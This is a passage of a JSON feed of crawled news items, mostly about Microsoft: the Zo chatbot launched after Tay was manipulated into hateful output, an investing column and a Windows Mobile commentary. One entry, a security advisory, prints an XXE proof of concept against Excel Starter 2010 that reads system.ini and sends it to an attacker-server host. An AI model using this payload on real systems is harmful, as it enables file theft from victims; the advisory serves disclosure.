{
  "posts": [
    {
      "thread": {
        "uuid": "44c500f9da3a3f87c66062c6546cd17f86fc40ee",
        "url": "http://omgili.com/ri/jHIAmI4hxg8y5ia1l.boMj1MVMXIPC0kWs94YxFs6mwg0.QiRzCEp12Kya6vK1Q1F8ftxMx_YWc780E0GwG9Mp7X8Brx2CdxdkkGjHrkb.vY7VTi1oAjPF46mF4uEyBCo6dwiSBUR2TQ.q1s4g7gZQ--",
        "site_full": "www.seattletimes.com",
        "site": "seattletimes.com",
        "site_section": "http://www.seattletimes.com/feed",
        "site_categories": [
          "news"
        ],
        "section_title": "The Seattle Times The Seattle Times",
        "title": "Microsoft introduces chatbot named Zo after Tay went awry",
        "title_full": "Microsoft introduces chatbot named Zo after Tay went awry",
        "published": "2016-12-06T00:42:51.773+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://www.seattletimes.com/wp-content/themes/st_refresh/img/st-meta-facebook.png",
        "performance_score": 0,
        "domain_rank": 3285,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "44c500f9da3a3f87c66062c6546cd17f86fc40ee",
      "url": "http://omgili.com/ri/jHIAmI4hxg8y5ia1l.boMj1MVMXIPC0kWs94YxFs6mwg0.QiRzCEp12Kya6vK1Q1F8ftxMx_YWc780E0GwG9Mp7X8Brx2CdxdkkGjHrkb.vY7VTi1oAjPF46mF4uEyBCo6dwiSBUR2TQ.q1s4g7gZQ--",
      "ord_in_thread": 0,
      "author": "Matt Day",
      "published": "2016-12-06T00:42:51.773+02:00",
      "title": "Microsoft introduces chatbot named Zo after Tay went awry",
      "text": "Microsoft introduces chatbot named Zo after Tay went awry Originally published December 5, 2016 at 2:39 pm The new chatbot appears to avoid discussion of politics, religion and race entirely and lives only on the Kik messaging application. Share story Matt Day Seattle Times technology reporter \nMicrosoft is taking another stab at building a chatbot, several months after Tay, an earlier attempt, was taken offline when some internet users convinced it to spout racist and sexist comments. \nThe company’s second try, Zo , lives on the Kik messaging application. \nSpotted over the weekend by a Microsoft-tracking blog , Zo appears to avoid discussion of politics, religion and race entirely. It also has a narrower release than Tay, which, because of its place on the public Twitter platform, had its meltdown in view of the entire internet. \nMicrosoft launched Tay, a millennial-imitating chatbot, in March. The bot, powered by machine learning algorithms, was designed to mine public data, as well as the input of people who engaged with it on Twitter, Kik and GroupMe, to come up with phrases to use in conversation. Most Read Stories Unlimited Digital Access. $1 for 4 weeks. \nA day later, the bot was advocating genocide and calling for the murder of feminists. \nMicrosoft took Tay down and said it would make adjustments. The company said the bot was the victim of a coordinated attack by internet users interested in manipulating its responses. \nMicrosoft and other technology companies have bet on chatbot interaction — and the artificial intelligence-imitating tools that underpin them — as one of the next computing interfaces. \nThe company’s experiments with a chatbot in the U.S. follow the success Microsoft had with Xiaoice, a chatbot the company introduced in China in 2014. \nXiaoice itself has quirks that would raise eyebrows in the U.S. China Digital Times reported last month that Microsoft had apparently programmed the bot to avoid discussing the government’s crackdown on the 1989 Tiananmen Square protests. \nBeijing heavily censors China’s internet, from content on chat and news sources to bans on entire websites, including Facebook. Matt Day: 206-464-2420 or . On Twitter @mattmday Email Newsletter Sign-up Custom-curated news highlights, delivered weekday mornings. Email address By signing up you are agreeing to our Privacy Policy and Terms of Service . Thanks for signing up!",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "tay",
            "sentiment": "neutral"
          },
          {
            "name": "xiaoice",
            "sentiment": "none"
          },
          {
            "name": "matt day",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "terms of service",
            "sentiment": "none"
          },
          {
            "name": "u.s. china digital times",
            "sentiment": "none"
          },
          {
            "name": "kik",
            "sentiment": "none"
          },
          {
            "name": "facebook",
            "sentiment": "none"
          },
          {
            "name": "seattle times",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "u.s.",
            "sentiment": "none"
          },
          {
            "name": "tiananmen square",
            "sentiment": "none"
          },
          {
            "name": "beijing",
            "sentiment": "none"
          },
          {
            "name": "china",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-06T00:42:51.773+02:00"
    },
    {
      "thread": {
        "uuid": "2b5bd53f920de62d112f12dd7a5fb8dc77fa81c2",
        "url": "http://omgili.com/ri/jHIAmI4hxg9BcPFu_4VOJxXOPE7_XaSqsYNALxtw2t29WQjvQQJ7tdM4S5AiaHZufV9kj0N5JO0YLocJCNO4kBf8QAdQnzYWdZT.Z.lIkn650PI5VqAdmXoza4nERZa2_gYc3GApwDYMseSQiThf0A--",
        "site_full": "www.onenewspage.com",
        "site": "onenewspage.com",
        "site_section": "http://www.onenewspage.com/rss/latest/Business.rss",
        "site_categories": [
          "news",
          "entertainment",
          "education"
        ],
        "section_title": "Latest Business News on One News Page",
        "title": "Microsoft introduces chatbot named Zo after Tay went awry",
        "title_full": "Microsoft introduces chatbot named Zo after Tay went awry - One News Page",
        "published": "2016-12-06T00:50:22.710+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://cdn.newsserve.net/ONPglobe128.png",
        "performance_score": 0,
        "domain_rank": 91686,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "2b5bd53f920de62d112f12dd7a5fb8dc77fa81c2",
      "url": "http://omgili.com/ri/jHIAmI4hxg9BcPFu_4VOJxXOPE7_XaSqsYNALxtw2t29WQjvQQJ7tdM4S5AiaHZufV9kj0N5JO0YLocJCNO4kBf8QAdQnzYWdZT.Z.lIkn650PI5VqAdmXoza4nERZa2_gYc3GApwDYMseSQiThf0A--",
      "ord_in_thread": 0,
      "author": "onenewspage.com",
      "published": "2016-12-06T00:50:22.710+02:00",
      "title": "Microsoft introduces chatbot named Zo after Tay went awry",
      "text": "The new chatbot appears to avoid discussion of politics, religion and race entirely and lives only on the Kik messaging application.",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "tay",
            "sentiment": "neutral"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "kik",
            "sentiment": "none"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T00:50:22.710+02:00"
    },
    {
      "thread": {
        "uuid": "89b13a2a50a81f8356736c25de3872e634617611",
        "url": "http://omgili.com/ri/jHIAmI4hxg9BcPFu_4VOJxXOPE7_XaSq6r8uOv7awOMJ0l8pkc4.psSEKjZqJu7jZSj7zBxARyPhbP1WBzGePeTvGxyvYfh26EnTNhkJ_aVXLJxRnR8WK_mbIy7yrIatood0LOGPjLknFPoD9C6x0Q--",
        "site_full": "www.onenewspage.com",
        "site": "onenewspage.com",
        "site_section": "http://www.onenewspage.com/rss/latest/Front+Page.rss",
        "site_categories": [
          "news",
          "entertainment",
          "education"
        ],
        "section_title": "Latest Front Page News on One News Page",
        "title": "Microsoft introduces chatbot named Zo after Tay went awry",
        "title_full": "Microsoft introduces chatbot named Zo after Tay went awry - One News Page",
        "published": "2016-12-06T01:08:42.503+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://cdn.newsserve.net/ONPglobe128.png",
        "performance_score": 0,
        "domain_rank": 91686,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "89b13a2a50a81f8356736c25de3872e634617611",
      "url": "http://omgili.com/ri/jHIAmI4hxg9BcPFu_4VOJxXOPE7_XaSq6r8uOv7awOMJ0l8pkc4.psSEKjZqJu7jZSj7zBxARyPhbP1WBzGePeTvGxyvYfh26EnTNhkJ_aVXLJxRnR8WK_mbIy7yrIatood0LOGPjLknFPoD9C6x0Q--",
      "ord_in_thread": 0,
      "author": "onenewspage.com",
      "published": "2016-12-06T01:08:42.503+02:00",
      "title": "Microsoft introduces chatbot named Zo after Tay went awry",
      "text": "The new chatbot appears to avoid discussion of politics, religion and race entirely and lives only on the Kik messaging application.",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "tay",
            "sentiment": "neutral"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "kik",
            "sentiment": "none"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T01:08:42.503+02:00"
    },
    {
      "thread": {
        "uuid": "e8000532ef20f58277babd4f8d499627603d9c9e",
        "url": "http://omgili.com/ri/7aBdisT0NOrO1_KRh30qwogLBAUlEvcqid9xGeFh8PgpLf6WrUSXs2atVve9ilCeUlCcw6VQVrbm_3oaCKRd.Acg6jugzHJFzYeGY_dzxiU-",
        "site_full": "seekingalpha.com",
        "site": "seekingalpha.com",
        "site_section": "http://seekingalpha.com/by/symbol/msft/feed",
        "site_categories": [
          "business"
        ],
        "section_title": "MSFT - News and Analysis from Seeking Alpha",
        "title": "Trump’s tax holiday actually may not go to plan. How will Ap",
        "title_full": "Trump’s tax holiday actually may not go to plan. How will Ap",
        "published": "2016-12-01T20:54:00.000+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "https://staticseekingalpha.a.ssl.fastly.net/uploads/2016/11/30/8647641-14805318336198475.png",
        "performance_score": 0,
        "domain_rank": 1432,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "e8000532ef20f58277babd4f8d499627603d9c9e",
      "url": "http://omgili.com/ri/7aBdisT0NOrO1_KRh30qwogLBAUlEvcqid9xGeFh8PgpLf6WrUSXs2atVve9ilCeUlCcw6VQVrbm_3oaCKRd.Acg6jugzHJFzYeGY_dzxiU-",
      "ord_in_thread": 0,
      "author": "seekingalpha.com",
      "published": "2016-12-01T20:54:00.000+02:00",
      "title": "Trump’s tax holiday actually may not go to plan. How will Ap",
      "text": "Trump’s tax holiday actually may not go to plan. How will Apple, Microsoft, and others spend their offshore money?\nA corporate share buyback and dividend binge could be on the horizon.\nChasing stocks is for chumps.\n\nThe stock market has significantly risen since President-elect Donald Trump won the Oval Office. The Dow, the Nasdaq, and the S&P 500 (NYSEARCA: SPY ) had another record close on Black Friday. Markets are reacting positively to pre-election promises and policies that Trump touted in almost every rally speech.\nThere's expectations that Trump will overhaul financial regulations like Dodd-Frank (clear positive for large banks), increase infrastructure spending, cut corporate taxes, and boost the nation's manufacturing sector. So what we're seeing is a number of \"Trump trades\" or bets on companies in industries projected to perform well under a Trump presidency.\nTrump wants to cut the business tax rate from 35% to 15% in an effort to keep U.S. companies from leaving for countries with lower tax rates. This should be generally positive for U.S. equity markets and capital investment. The one piece of proposed legislation that interests me is the one-off repatriation tax holiday at a 10% tax rate. This will give U.S. multinationals like Apple (NASDAQ: AAPL ) the chance to repatriate trillions of dollars in cash stockpiled overseas.\nAccording to Congress's Joint Committee on Taxation, there's about $2.6 trillion in profits parked overseas in tax haven subsidiaries (source: Bloomberg ).\nApple will be a real beneficiary of any tax holiday, as would Microsoft (NASDAQ: MSFT ), and many other U.S. tech companies. The top 10 largest tech companies have more than half a trillion dollars overseas. Today, Apple and Microsoft's offshore cash represents 36.3% and 23.4% of their respective market values. Pharmaceuticals like Johnson & Johnson (NYSE: JNJ ), Pfizer (NYSE: PFE ), and Merck (NYSE: MRK ) have plenty of cash overseas as well.\nThe chart below shows the top 5 U.S. companies with the most offshore cash (source: Bloomberg). Moody's Investor Service estimates that the top 5 will accumulate $505 billion overseas by year-end, up from $441 billion in 2015.\n(in US$ billions) \nOffshore cash as of Sept. 30 \nEst. Offshore cash by year-end \nApple\n$216\n$230\nMicrosoft\n$111\n$113\nCisco Systems (NASDAQ: CSCO )\n$60\n$62\nOracle Corp (NASDAQ: ORCL )\n$51\n$52\nAlphabet   )\n$48\n$49\nClick to enlarge (Source: Bloomberg and Investor's Business Daily )\nThe reason they keep money offshore in tax haven subsidiaries is because to bring that cash back you must pay a 35% tax. Apple's CEO Tim Cook in December last year said that he would \"love\" to repatriate some of Apple's cash, but not at a 40% tax rate (combining federal and state taxes). It just doesn't make sense for any business to repatriate cash when you got to pay a substantial tax on it.\nSo will U.S. companies take advantage of the one-time 10% tax rate? Maybe. Some U.S. multinationals have many reinvestment opportunities outside of the U.S., so they may not consider repatriating their cash. Instead, they rather invest in markets where they produce most of their sales and profits.\nCorporate buyback and dividend binge? \nTrump says the repatriated cash guarantees bigger tax revenues that would partly fund his $1 trillion infrastructure program over the next 10 years (clear benefit for E&C's, equipment rental firms, and material producers). This spending would lead to increased economic productivity and growth. On top of that, Trump expects U.S. companies will use the repatriated cash on \"growth capital\" investments like building new manufacturing plants and factories at home to fuel job growth.\nOn paper, this is all very promising. But I don't think it will all go accordingly to Trump's plan. I expect the repatriated cash will benefit investors rather than job creation. Instead, the cash will be returned to shareholders through dividends and share buybacks. This is how U.S. companies reacted in the past, why not expect more of the same again?\nThe U.S. last introduced a one-time tax holiday under the Homeland Investment Act in 2004. About 843 U.S. corporations returned more than $300 billion at a reduced rate of 5.25% (nearly half of what Trump's proposing). The legislation didn't allow companies to use the cash to buy back shares, but they still did anyway. Over 90% of the repatriated cash was used for buybacks, dividends, and executive compensation. It didn't serve to create U.S. jobs or build new factories as planned. \nCisco's CEO Chuck Robbins was asked how he would spend the repatriated cash in an interview with Bloomberg. He said: \"We do have various scenarios in terms of what we'd do but you can assume we'll focus on the obvious ones - buybacks , dividends , and M&A activities.\"\nIt seems like wishful thinking to believe U.S. companies won't spend majority of their foreign cash on buybacks and dividends. Trump's Black Friday-like tax holiday for American corporations sounds like a good idea, but it's really a big gamble on infrastructure and job growth.\nIt's also a big gamble if you're merely buying specific stocks that could benefit from Trump's future policy changes. In this case, you're not investing, but dangerously speculating, and ignoring the underlying fundamentals of a business which drive stock performance. You don't know if his plans will come to fruition (e.g. repeal of Dodd-Frank). Chasing what's hot in the market without doing your own homework is risky investment behavior and you're setting yourself up to lose money.\nIf U.S. multinationals do repatriate cash, the U.S. will see an influx of capital flows, and that should benefit the U.S. dollar (clear negative for consumer staples like Colgate-Palmolive (NYSE: CL ) and Procter & Gamble (NYSE: PG )). The U.S. is seeing economic growth return, with Q3 GDP expanding to 3.2% (versus 1.4% in Q2), and this is fueling the strength of the U.S. dollar against foreign currencies. Growth is favoring the U.S. Fed futures market, now pricing a 100% probability of a rate hike on December 14.\nThe U.S. Fed has held the fed funds rate target range at 0.25% to 0.50% since December 2015. The financial sector, which was the worst performing sector at the start of the year, has rallied hard the past few weeks becoming the best performing sector over the last 12 months. Higher interest rates increase net interest margins and profits for banks, like JP Morgan (NYSE: JPM ), Goldman Sachs (NYSE: GS ), Bank of America (NYSE: BAC ), and Morgan Stanley (NYSE: MS ).\nIf you're buying these banks solely because of the expectation of the Fed bumping up interest rates or the repeal of Dodd-Frank, you're not investing, but speculating. There's substantial downside risk for many of the stocks that have moved higher because of possible Trump policies, and even the Fed's expected rate hike in two weeks. Instead, focus your energy on due diligence. Investigate your investments before making an informed investment decision.\nAvoid the herd mentality. Chasing stocks is for chumps.\nReading recommendations: \nSell Everything Now? Stock Market Punditry In 1 Chart (Seeking Alpha) The Key to Great Investing (CFA Institute) Two Important Investment Principles (Base Hit Investing) Disclosure: I/we have no positions in any stocks mentioned, and no plans to initiate any positions within the next 72 hours. \n \n  Macro View , Market Outlook , Market News Article  ",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "trump",
            "sentiment": "negative"
          },
          {
            "name": "donald trump",
            "sentiment": "none"
          },
          {
            "name": "merck",
            "sentiment": "none"
          },
          {
            "name": "tim cook",
            "sentiment": "none"
          },
          {
            "name": "chuck robbins",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "apple",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "goldman sachs",
            "sentiment": "none"
          },
          {
            "name": "cisco systems",
            "sentiment": "none"
          },
          {
            "name": "e&c",
            "sentiment": "none"
          },
          {
            "name": "bank of america",
            "sentiment": "none"
          },
          {
            "name": "congress's joint committee on taxation",
            "sentiment": "none"
          },
          {
            "name": "fed",
            "sentiment": "none"
          },
          {
            "name": "trump",
            "sentiment": "none"
          },
          {
            "name": "colgate-palmolive",
            "sentiment": "none"
          },
          {
            "name": "cisco",
            "sentiment": "none"
          },
          {
            "name": "procter & gamble",
            "sentiment": "none"
          },
          {
            "name": "u.s. fed",
            "sentiment": "none"
          },
          {
            "name": "johnson & johnson",
            "sentiment": "none"
          },
          {
            "name": "morgan stanley",
            "sentiment": "none"
          },
          {
            "name": "moody's investor service",
            "sentiment": "none"
          },
          {
            "name": "s&p",
            "sentiment": "none"
          },
          {
            "name": "jp morgan",
            "sentiment": "none"
          },
          {
            "name": "pfizer",
            "sentiment": "none"
          },
          {
            "name": "cfa institute",
            "sentiment": "none"
          },
          {
            "name": "bloomberg",
            "sentiment": "none"
          },
          {
            "name": "nyse",
            "sentiment": "none"
          },
          {
            "name": "oracle corp",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "u.s.",
            "sentiment": "none"
          },
          {
            "name": "oval office",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-06T01:42:15.475+02:00"
    },
    {
      "thread": {
        "uuid": "3078d426939356829bbd61042acdab1b4a3013b6",
        "url": "http://omgili.com/ri/.wHSUbtEfZRXZf_GqEtqZq3thqVOJGTa09PjlDPPlLVrDJYG4rkBySOU.RLX9zf4zjElbDZYkIt1a85b7B_xR0x8_.og4Hq_HvbQJspQSPmRs6Bm087aQAC0.x.WBTp.sXcP0QNqTUo-",
        "site_full": "packetstormsecurity.com",
        "site": "packetstormsecurity.com",
        "site_section": "http://www.packetstormsecurity.org/whatsnew20.xml",
        "site_categories": [
          "tech"
        ],
        "section_title": "Files ≈ Packet Storm",
        "title": "Microsoft Excel Starter 2010 XXE Injection",
        "title_full": "Microsoft Excel Starter 2010 XXE Injection",
        "published": "2016-12-04T16:22:00.000+02:00",
        "replies_count": 0,
        "participants_count": 0,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "",
        "performance_score": 0,
        "domain_rank": 95804,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "3078d426939356829bbd61042acdab1b4a3013b6",
      "url": "http://omgili.com/ri/.wHSUbtEfZRXZf_GqEtqZq3thqVOJGTa09PjlDPPlLVrDJYG4rkBySOU.RLX9zf4zjElbDZYkIt1a85b7B_xR0x8_.og4Hq_HvbQJspQSPmRs6Bm087aQAC0.x.WBTp.sXcP0QNqTUo-",
      "ord_in_thread": 0,
      "author": "",
      "published": "2016-12-04T16:22:00.000+02:00",
      "title": "Microsoft Excel Starter 2010 XXE Injection",
      "text": "Microsoft Excel Starter OLD versions specifically \".xls\" and \".xlthtml\"files are vulnerable to XML External Entity attack. This can allowremote attackers to access and disclose ANY files from a victims computerif they open a corrupt \".xls\" Excel file. We can also abuse XXE tomake connections to the victims system/LAN and bypass Firewall,IPS etc(XXE/SSRF).Note: This has NOT worked in regular or updated patched Excel editions.When open the victim will get a warn message about it being a \"differentformat and from trusted source\".If user choose open the file they get error message \"File cannot be openedbecause: System does not support the specified encoding.\"Then files you target get accessed and transfered to remote server.IF Excel version is \"patched\" or newer you will see message like \"Filecannot be opened because: Reference to undefined entity 'send' etc...\"and XXE will fail.Tested successfully on several machines HP, TOSHIBA Windows 7 SP1 withExcel Starter 2010 versions. As some machines may still be running oldpre-loaded Excel version it can be relevant so I release it anyways...Exploit code(s):POC to exfiltrate \"system.ini\" used by MS ADO Remote Data Services.Listen port 8080 (ATTACKER-SERVER)1) \"payload.dtd\" ( host on attacker server port 8080 same dir as our pythonweb server )<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % all \"<!ENTITY send SYSTEM 'http://ATTACKER-SERVER:8080?%file;'>\">%all;2) \"PWN.xls\" Get vicitm to open it, ANY files belong to you!<?xml version=\"1.0\"?><!ENTITY % file SYSTEM \"C:\\Windows\\system.ini\"><!ENTITY % dtd SYSTEM \"http://ATTACKER-SERVER:8080/payload.dtd\">",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T02:23:04.971+02:00"
    },
    {
      "thread": {
        "uuid": "3f197df8ea92c647ac2e5f3c6bbc2548b4ffbec4",
        "url": "http://omgili.com/ri/jHIAmI4hxg.aX6RsjGyewfcSSfrAK5bcECJxfbEt.UYXZR1wkL54TvVgdnGKiJ5088fR7CiB2RiWwL_X66xF5l8Z1ji0MiG6v6p3nqsnyeq2OwO4BfmhPQ7x1HMvX1cK",
        "site_full": "www.androidheadlines.com",
        "site": "androidheadlines.com",
        "site_section": "http://www.androidheadlines.com/feed",
        "site_categories": [
          "news",
          "tech"
        ],
        "section_title": "AndroidHeadlines.com |",
        "title": "Tech Talk: Is Microsoft Jumping Its Own Mobile Ship?",
        "title_full": "Tech Talk: Is Microsoft Jumping Its Own Mobile Ship?",
        "published": "2016-12-06T02:38:51.811+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://www.androidheadlines.com/wp-content/uploads/2014/06/cortana-windows-phone.jpg",
        "performance_score": 0,
        "domain_rank": 10399,
        "social": {
          "facebook": {
            "likes": 33,
            "comments": 0,
            "shares": 33
          },
          "gplus": {
            "shares": 3
          },
          "pinterest": {
            "shares": 1
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "3f197df8ea92c647ac2e5f3c6bbc2548b4ffbec4",
      "url": "http://omgili.com/ri/jHIAmI4hxg.aX6RsjGyewfcSSfrAK5bcECJxfbEt.UYXZR1wkL54TvVgdnGKiJ5088fR7CiB2RiWwL_X66xF5l8Z1ji0MiG6v6p3nqsnyeq2OwO4BfmhPQ7x1HMvX1cK",
      "ord_in_thread": 0,
      "author": "Daniel Fuller",
      "published": "2016-12-06T02:38:51.811+02:00",
      "title": "Tech Talk: Is Microsoft Jumping Its Own Mobile Ship?",
      "text": "Tech Talk: Is Microsoft Jumping Its Own Mobile Ship?   Daniel Fuller \nSupporters of Microsoft’s Windows Phone mobile ecosystem, now on to the somewhat new Windows 10 Mobile, have a number of differentiating features to look to in their OS. Windows 10 Mobile features Continuum, a technology that makes it easy to make your phone pretend it’s a computer, and Microsoft is reportedly even thinking about allowing users to run full desktop Windows apps in this mode. The HP Elite X3, for example, includes this functionality in a very early form, but the apps are virtual and run far slower than they would on a native x86-based system. There has been talk of an actual x86-based Windows Phone running full Windows 10, and that wouldn’t be too far-fetched – many a phone actually have used Intel’s processors in the past, and some LTE Windows tablets in sizes almost considered small enough to be a phone do exist, but that’s a suboptimal solution for those looking for a true all-in-one device. Microsoft’s other non-traditional hardware platform, the Microsoft Band family, also has its concerned fans, saying that a lack of new features and updates has let the Microsoft Band unable to compete with similar solutions on the market. \nWith these concerns in hand, shareholders at a recent meeting demanded that Microsoft CEO Satya Nadella explain how the company plans to address these issues and bring their non-PC hardware lineup up to speed with the rest of the industry. In response, Nadella said that Microsoft is focusing on what makes their mobile ecosystem different, playing to its strengths in a bid to make it more appealing to users who would normally go for more niche entries in the Android world, or for iOS devices. Features like device security and content and function interlock with other devices often draw users to the iOS and Mac ecosystem, or to Google’s tightly-knit Android and Chrome OS ecosystem, and Microsoft is hoping to appeal to these users with the features unique to the Windows ecosystem. One of the problems with that, however, is a limited app ecosystem, and that’s a problem that Microsoft actually seems to be contributing to. Apps like Outlook have ended up being available on Android and iOS before Windows 10 Mobile. According to Nadella, however, this is intentional; Microsoft holds “from the ground up” control of the current Windows Mobile ecosystem, including the hardware of Lumia phones. This allows them to integrate into the system the kind of functions that are baked into dedicated apps on other mobile ecosystems. There is, however, still the issue of waning developer interest; essentially, without some kind of mass appeal to developers, surge in user numbers, or adding in x86 and Win32 compatibility, the Windows Mobile ecosystem will always be inherently limited compared to the competition. \nEssentially, it seems at this point that Nadella is determined to turn Windows into a cohesive ecosystem like the Google and Apple worlds, rather than the bastion of one-size-fits-all utility that it has been in the past. With more and more users jumping ship from the traditional Windows ecosystem as apps that had bound them to it make their way to other ecosystems, Microsoft is left scrambling to catch Windows up in other ways in order to see the ecosystem and OS flourish. Right now, accessing all of your files seamlessly across your phone and computer is something that users of all ecosystems can do, but it may be difficult for an Android user with a Windows PC or a Mac user with a Windows phone, which can help to discourage people from using Microsoft’s ecosystem because of Windows Phone’s arguably limited functionality. There are a few ways that Microsoft could reverse this trend, and Nadella seems set on playing to the ecosystem’s inherent strengths to draw users, which would in turn attract developers. Only time will tell if this gamble will work out. Post navigation",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "daniel fuller",
            "sentiment": "neutral"
          },
          {
            "name": "satya nadella",
            "sentiment": "none"
          },
          {
            "name": "nadella",
            "sentiment": "none"
          },
          {
            "name": "lumia",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "apple",
            "sentiment": "none"
          },
          {
            "name": "intel",
            "sentiment": "none"
          },
          {
            "name": "google",
            "sentiment": "none"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T02:38:51.811+02:00"
    },
    {
      "thread": {
        "uuid": "1dc17b0da67c68c11959add79ec935297aa51fb3",
        "url": "http://omgili.com/ri/jHIAmI4hxg9HBkbHaUfvcbzx.3qYR9b1VWWfG1cyqXKx7eNDASPeiiKFHqxbRBin7PhiHlz0O5i2qlpLg9sDRcNXoo_ocRpW1JQxS0ptyUpJd87ZCINl1ehlwqLjA657",
        "site_full": "www.columbian.com",
        "site": "columbian.com",
        "site_section": "http://www.columbian.com",
        "site_categories": [
          "news",
          "education"
        ],
        "section_title": "Columbian.comBusiness – Columbian.com",
        "title": "Microsoft’s new chatbot Zo won’t discuss politics",
        "title_full": "Microsoft’s new chatbot Zo won’t discuss politics",
        "published": "2016-12-06T02:46:35.092+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": null,
        "performance_score": 0,
        "domain_rank": 49097,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "1dc17b0da67c68c11959add79ec935297aa51fb3",
      "url": "http://omgili.com/ri/jHIAmI4hxg9HBkbHaUfvcbzx.3qYR9b1VWWfG1cyqXKx7eNDASPeiiKFHqxbRBin7PhiHlz0O5i2qlpLg9sDRcNXoo_ocRpW1JQxS0ptyUpJd87ZCINl1ehlwqLjA657",
      "ord_in_thread": 0,
      "author": "Matt Day, The Seattle Times",
      "published": "2016-12-06T02:46:35.092+02:00",
      "title": "Microsoft’s new chatbot Zo won’t discuss politics",
      "text": "Microsoft is taking another stab at building a chatbot, several months after Tay, an earlier attempt, was taken offline when internet users made it spout racist and sexist comments.\nThe company’s second try, Zo, lives on the Kik messaging application.\nSpotted over the weekend by a Microsoft-tracking blog, Zo appears to avoid discussion of politics, religion and race entirely. It has a narrower release than Tay, which, because of its place on the public Twitter platform, melted down in view of the entire internet.\nMicrosoft launched Tay, a millennial-imitating chatbot, in March. The bot, powered by machine learning algorithms, was designed to mine public data and the input of people who engaged with it on Twitter, Kik and GroupMe, to come up with phrases to use in conversation.\nA day later, the bot was advocating genocide and calling for the murder of feminists.\nMicrosoft took Tay down and said it would make adjustments. The company said the bot was the victim of a coordinated attack by internet users interested in manipulating its responses.\nMicrosoft and other technology companies have bet on chatbot interaction — and the artificial intelligence-imitating tools that underpin them — as one of the next computing interfaces.\nThe company’s experiments with a chatbot in the U.S. follow the success Microsoft had with Xiaoice, a chatbot the company introduced in China in 2014.\n",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "tay",
            "sentiment": "neutral"
          },
          {
